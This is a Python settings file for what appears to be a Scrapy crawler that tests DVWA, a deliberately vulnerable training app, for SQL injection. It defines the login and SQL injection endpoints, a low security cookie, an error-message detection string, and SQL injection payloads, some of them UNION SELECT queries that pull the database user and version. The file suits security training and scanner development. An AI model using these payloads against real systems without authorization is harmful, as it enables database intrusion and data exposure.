# Scrapy Settings
USER_AGENT_KEY = 'USER_AGENT'
ITEM_PIPELINES_KEY = 'ITEM_PIPELINES'

# DVWA
DVWA_CRAWLER_NAME = 'dvwa'
DVWA_SITE_NAME = DVWA_CRAWLER_NAME
DVWA_LOGIN_ENDPOINT = 'login.php'
DVWA_VULNERABILITY_ENDPOINTS = ['vulnerabilities/sqli/']

# SQL injection payloads
SQL_ALWAYS_TRUE_PAYLOAD = """%' or '0'='0"""
SQL_SYNTAX_ERROR_PAYLOAD = "';;;'"
SQL_GET_DB_USER_PAYLOAD = """%' or 0=0 union select null, user() #"""
SQL_GET_DB_VERSION_PAYLOAD = """%' or 0=0 union select null, version() #"""
SQL_VULNERABILITY_CHECK_TEXT = 'You have an error in your SQL syntax'

# Cookies
SECURITY_COOKIE_KEY = 'security'
SECURITY_COOKIE_LOW_VALUE = 'low'

# Html form attributes
FORM_ID_KEY = 'id'
